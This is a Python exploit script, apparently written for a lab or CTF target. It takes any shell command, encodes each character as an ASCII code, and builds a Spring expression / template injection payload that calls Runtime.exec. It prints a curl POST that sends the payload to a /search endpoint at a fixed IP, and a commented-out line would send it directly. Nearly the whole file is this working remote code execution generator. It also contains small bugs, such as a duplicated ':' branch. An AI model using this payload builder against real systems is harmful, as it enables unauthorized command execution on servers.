import os
import time

val = input("Enter your command: ")
#print(val)

def split_str(s):
	return [c for c in s]
	s = val1
	print("The given string is as follows:")
	print(s)
	print("The string converted to characters are as follows:")
	print(split_str(s))
test = split_str(val)
c = len(test)
#print(c)
x = c 
q = 0
list2 = []
for c in test:
	if q == x:
		break
	list1 = []
	if test[q] == "!":
		list1.append(33)
	elif test[q] == " ":
		list1.append(32)
	elif test[q] == "\"":
        	list1.append( 34 )
	elif test[q] == "#" :
        	list1.append( 35 )
	elif test[q] == "$" :
		list1.append( 36 )
	elif test[q] == "%" :
		list1.append( 37 )
	elif test[q] == "&" :
		list1.append( 38 )
	elif test[q] == "'" :
		list1.append( 39 )
	elif test[q] == "(" :
		list1.append( 40 )
	elif test[q] == ")" :
		list1.append( 41 )
	elif test[q] == "*" :
		list1.append( 42 )
	elif test[q] == "+" :
		list1.append( 43 )
	elif test[q] == "," :
		list1.append( 44 )
	elif test[q] == "-" :
		list1.append( 45 )
	elif test[q] == "." :
		list1.append( 46 )
	elif test[q] == "/" :
		list1.append( 47 )
	elif test[q] == "0" :
		list1.append( 48 )
	elif test[q] == "1" :
		list1.append( 49 )
	elif test[q] == "2" :
		list1.append( 50 )
	elif test[q] == "3" :
		list1.append( 51 )
	elif test[q] == "4" :
		list1.append( 52 )
	elif test[q] == "5" :
		list1.append( 53 )
	elif test[q] == "6" :
		list1.append( 54 )
	elif test[q] == "7" :
		list1.append( 55 )
	elif test[q] == "8" :
		list1.append( 56 )
	elif test[q] == "9" :
		list1.append( 57 )
	elif test[q] == ":" :
		list1.append( 58 )
	elif test[q] == ":" :
		list1.append( 59 )
	elif test[q] == "<" :
		list1.append( 60 )
	elif test[q] == "=" :
		list1.append( 61 )
	elif test[q] == ">" :
		list1.append( 62 )
	elif test[q] == "?" :
		list1.append( 63 )
	elif test[q] == "@" :
		list1.append( 64 )
	elif test[q] == "A" :
		list1.append( 65 )
	elif test[q] == "B" :
		list1.append( 66 )
	elif test[q] == "C" :
		list1.append( 67 )
	elif test[q] == "D" :
		list1.append( 68 )
	elif test[q] == "E" :
		list1.append( 69 )
	elif test[q] == "F" :
		list1.append( 70 )
	elif test[q] == "G" :
		list1.append( 71 )
	elif test[q] == "H" :
		list1.append( 72 )
	elif test[q] == "I" :
		list1.append( 73 )
	elif test[q] == "J" :
		list1.append( 74 )
	elif test[q] == "K" :
		list1.append( 75 )
	elif test[q] == "L" :
		list1.append( 76 )
	elif test[q] == "M" :
		list1.append( 77 )
	elif test[q] == "N" :
		list1.append( 78 )
	elif test[q] == "O" :
		list1.append( 79 )
	elif test[q] == "P" :
		list1.append( 80 )
	elif test[q] == "Q" :
		list1.append( 81 )
	elif test[q] == "R" :
		list1.append( 82 )
	elif test[q] == "S" :
		list1.append( 83 )
	elif test[q] == "T" :
		list1.append( 84 )
	elif test[q] == "U" :
		list1.append( 85 )
	elif test[q] == "V" :
		list1.append( 86 )
	elif test[q] == "W" :
		list1.append( 87 )
	elif test[q] == "X" :
		list1.append( 88 )
	elif test[q] == "Y" :
		list1.append( 89 )
	elif test[q] == "Z" :
		list1.append( 90 )
	elif test[q] == "[" :
		list1.append( 91 )
	elif test[q] == "\\" :
		list1.append( 92 )
	elif test[q] == "]" :
		list1.append( 93 )
	elif test[q] == "^" :
		list1.append( 94 )
	elif test[q] == "_" :
		list1.append( 95 )
	elif test[q] == "`" :
		list1.append( 96 )
	elif test[q] == "a" :
		list1.append( 97 )
	elif test[q] == "b" :
		list1.append( 98 )
	elif test[q] == "c" :
		list1.append( 99 )
	elif test[q] == "d" :
		list1.append( 100 )
	elif test[q] == "e" :
		list1.append( 101 )
	elif test[q] == "f" :
		list1.append( 102 )
	elif test[q] == "g" :
		list1.append( 103 )
	elif test[q] == "h" :
		list1.append( 104 )
	elif test[q] == "i" :
		list1.append( 105 )
	elif test[q] == "j" :
		list1.append( 106 )
	elif test[q] == "k" :
		list1.append( 107 )
	elif test[q] == "l" :
		list1.append( 108 )
	elif test[q] == "m" :
		list1.append( 109 )
	elif test[q] == "n" :
		list1.append( 110 )
	elif test[q] == "o" :
		list1.append( 111 )
	elif test[q] == "p" :
		list1.append( 112 )
	elif test[q] == "q" :
		list1.append( 113 )
	elif test[q] == "r" :
		list1.append( 114 )
	elif test[q] == "s" :
		list1.append( 115 )
	elif test[q] == "t" :
		list1.append( 116 )
	elif test[q] == "u" :
		list1.append( 117 )
	elif test[q] == "v" :
		list1.append( 118 )
	elif test[q] == "w" :
		list1.append( 119 )
	elif test[q] == "x" :
		list1.append( 120 )
	elif test[q] == "y" :
		list1.append( 121 )
	elif test[q] == "z" :
		list1.append( 122 )
	elif test[q] == "{" :
		list1.append( 123 )
	elif test[q] == "|" :
		list1.append( 124 )
	elif test[q] == "}" :
		list1.append( 125 )
	elif test[q] == "~" :
		list1.append( 126 )
	elif test[q] == "DEL" :
		list1.append( 127 )
	q += 1
	#print(list1)
	list2.append(list1)
	
#print(list2)
list3 = []
g = 0
while g == 0:
	list3.append((str(list2).replace('[','').replace(']','')))
	g += 1 
string1 = ','.join(str(u) for u in list3)
string2 = string1.split(", ")
#print(string2)
y = len(string2)
t = 0
p = 0
s = 0
while t != y:
	beg = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime()"
	if t == 0: 
		A = string2[t]
		A = str(A)
		exec1 = ".exec(T(java.lang.Character).toString("+ A +")"
		#print (exec1, sep='')
		t += 1
		final = (beg + exec1)
		
	else:	
		A = string2[t]
		A = str(A)
		vartest = ".concat(T(java.lang.Character).toString("+ A +"))"
		#print(vartest, sep='')
		t += 1
		final = final + vartest
end = ").getInputStream())}'"
done = (final + end)
done = str(done)
#print (done)
#os.popen("curl -X POST -F 'name=" + done + " http://10.10.11.170:8080/search")
time.sleep(4)
print("curl -X POST -F 'name=" + done + " http://10.10.11.170:8080/search") # change the IP if ya need to
exit()			

